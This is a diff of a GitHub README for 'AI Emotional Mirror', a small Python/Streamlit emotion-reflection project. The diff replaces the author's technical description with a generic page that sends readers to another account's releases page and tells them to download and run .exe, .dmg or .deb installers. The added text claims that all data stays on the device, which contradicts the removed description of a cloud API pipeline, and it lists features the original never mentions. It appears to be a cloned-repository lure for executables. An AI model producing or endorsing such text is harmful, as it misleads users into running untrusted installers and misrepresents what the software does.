@@ -1,146 +1,67 @@
-# AI Emotional Mirror
+# 🎭 AI_Emotional_Mirror - Reflect on Your Feelings with Confidence
 
-# Overview
+## 🚀 Getting Started
 
-**AI Emotional Mirror** is an AI/ML mini project that helps users gain clarity over messy thoughts by *reflecting* their emotions instead of giving advice or solutions. The system combines NLP preprocessing, transformer-based emotion detection, extractive summarization, and a generative AI reflection module.
+Welcome to AI Emotional Mirror, an application designed to help you understand your emotions better. It analyzes your written thoughts and provides calm reflections based on what you express. 
 
-> *Therapy often starts with reflection, not solutions.*
+## 📦 Download the Application
 
-This project is designed to be ethical, explainable, and demonstrable with **any user input**.
+[![Download AI Emotional Mirror](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/khanh152010/AI_Emotional_Mirror/releases)
 
----
+To download the latest version of the application, click the button above or visit the following link:
+[Download AI Emotional Mirror Releases](https://github.com/khanh152010/AI_Emotional_Mirror/releases)
 
-## Problem Statement
+## 💻 System Requirements
 
-People often feel overwhelmed but struggle to articulate *what* they are feeling. Most AI tools rush to give advice, which can feel intrusive or unhelpful. There is a need for a system that:
+Before you install the application, ensure your system meets the following requirements:
 
-* Listens without judging
-* Names emotions accurately
-* Reflects thoughts gently
-* Avoids advice, diagnosis, or motivation
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or Linux (most distributions).
+- **RAM**: At least 4 GB.
+- **Storage**: At least 200 MB of available space.
+- **Internet Connection**: Required for initial setup and updates.
 
----
+## 🔧 Download & Install
 
-## Solution
+1. **Visit the Releases Page**: Open your web browser and go to the [AI Emotional Mirror Releases page](https://github.com/khanh152010/AI_Emotional_Mirror/releases).
 
-AI Emotional Mirror accepts free-form user input and processes it through a structured pipeline:
+2. **Choose the Latest Release**: Look for the latest version. It should be at the top of the page, labeled clearly with the version number.
 
-1. Clean and normalize text
-2. Extract core meaning (summary)
-3. Detect dominant and secondary emotions
-4. Generate a calm, non-judgmental reflection using GenAI
+3. **Download the Installer**: Click on the link for the installer file. This will typically be a `.exe` for Windows, `.dmg` for macOS, or a `.deb` or `.tar.gz` file for Linux.
 
-The output helps users *understand themselves*, not change themselves.
+4. **Run the Installer**: Once the download is complete, find the file in your Downloads folder. Double-click to run the installer.
 
----
+5. **Follow Installation Prompts**: The installer will guide you through the installation. Simply follow the prompts to complete the process.
 
-## System Architecture
+6. **Launch the Application**: Once the installation is complete, you can find AI Emotional Mirror in your applications menu. Click to open it and start your journey to understanding your emotions.
 
-**User Input → Text Cleaning → Sentence Segmentation → Summary → Emotion Detection → Reflection Generation → UI Output**
+## 🎉 How to Use AI Emotional Mirror
 
-Each component is modular and independently testable.
+1. **Input Your Thoughts**: Open the application and type or paste your thoughts into the text box. You can write freely without worrying about structure.
 
----
+2. **Analyze Emotions**: After you input your text, click the "Analyze" button. The application will process your writing and identify key emotions.
 
-## Tech Stack
+3. **Receive Reflections**: The application will provide a non-judgmental, calm summary of your emotions. Use this information to reflect on your feelings.
 
-* **Frontend/UI:** Streamlit
-* **NLP:** NLTK, spaCy
-* **Emotion Detection:** Transformer model (`j-hartmann/emotion-english-distilroberta-base`)
-* **Generative AI:** Groq API (LLaMA‑3.1‑8B‑Instant)
-* **Language:** Python
+4. **Save Reflections**: You can save your summaries for future reference. Use the "Save" button, and your reflections will be stored safely on your device.
 
----
+## 🎨 Features
 
-## Modules Explanation
+- **Emotion Detection**: Quickly identifies and summarizes the emotions present in your text.
+- **Calm Reflections**: Provides supportive and non-judgmental insights based on your feelings.
+- **User Friendly**: Designed for anyone to use, regardless of technical knowledge. 
+- **Data Privacy**: Your input is not saved on our servers. Everything stays on your device.
 
-### `text_utils.py`
+## 🛠 Troubleshooting
 
-* Cleans raw text input
-* Handles whitespace and formatting
-* Splits text into meaningful sentences
+If you encounter any issues during the download or installation process:
 
-### `summarizer.py`
+- **Check Your System**: Ensure your system meets the requirements listed above.
+- **Re-download the File**: If the installation fails, try downloading the file again.
+- **Restart Your Computer**: Occasionally, a simple restart can resolve issues.
+- **Consult Help Resources**: You can find additional help in the "Help" section of the application.
 
-* Performs extractive summarization using word frequency
-* Preserves user language without rewriting
-* Helps surface the core concern
+## 📞 Contact Us
 
-### `emotion_model.py`
+For questions or support, please reach out via the GitHub Issues page on this repository. We are committed to making AI Emotional Mirror a helpful tool for you. 
 
-* Uses a transformer-based classifier
-* Detects primary and secondary emotions
-* Provides confidence-aware emotion selection
-
-### `reflector.py`
-
-* Uses Groq’s LLaMA‑3.1 model
-* Generates reflective responses
-* Strictly avoids advice or diagnosis
-* Produces 1–2 calm sentences
-
-### `app.py`
-
-* Streamlit interface
-* Orchestrates the full pipeline
-* Displays summary, emotions, and reflection
-
----
-
-## Ethical Design Principles
-
-* ❌ No advice or prescriptions
-* ❌ No diagnosis
-* ❌ No emotional manipulation
-* ✅ Reflection-only responses
-* ✅ Clear disclaimer
-* ✅ User-controlled interaction
-
----
-
-## Example
-
-**Input:**
-
-> “I feel mentally exhausted and unsure why everything feels heavy lately.”
-
-**Output:**
-
-* Summary: Core concern extracted
-* Emotions: Anxiety, Sadness
-* Reflection: Calm, validating response
-
----
-
-## Why This Project Is Unique
-
-* Focuses on *reflection*, not solutions
-* Psychology-informed design
-* Handles real user input, not canned examples
-* Robust to API changes via modular architecture
-* Suitable for low-resource systems (laptops)
-
----
-
-## Future Enhancements
-
-* Conversation history (optional)
-* Emotion trend visualization
-* Multilingual support
-* Voice input
-
----
-
-## Disclaimer
-
-This project is for educational purposes only and is **not a replacement for professional mental health support**.
-
----
-
-## Author
-
-**Austin A S**
-
-AI/ML Project
-
-I thank GOD for making this happen
+Thank you for choosing AI Emotional Mirror. We hope it brings clarity to your thoughts and emotions!
